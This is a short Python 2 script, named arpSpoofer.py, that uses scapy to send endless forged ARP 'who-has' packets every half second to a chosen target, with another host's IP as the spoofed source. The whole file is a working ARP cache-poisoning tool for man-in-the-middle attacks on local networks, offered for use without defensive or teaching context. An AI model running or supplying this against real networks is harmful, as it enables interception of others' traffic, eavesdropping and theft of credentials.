#!/usr/bin/env python

from scapy.all import *
import sys, getopt

def usage():
        print "Usage: sudo ./arpSpoofer.py [-i interface] <target> <host>"

def main(argv):
        try:
                opts, args = getopt.getopt(argv, "hi:t:")
        except getopt.GetoptError:
                usage()
                sys.exit(2)
        for opt, arg in opts:
                if opt in ("-h"):
                        usage()
                        sys.exit()
                elif opt in ("-i"):
                        conf.iface = arg
        if len(args) < 2:
                usage()
                sys.exit(2)
        send(ARP(op="who-has", psrc=args[1], pdst=args[0]), loop=1, inter=0.5)

if __name__ == "__main__":
    main(sys.argv[1:])

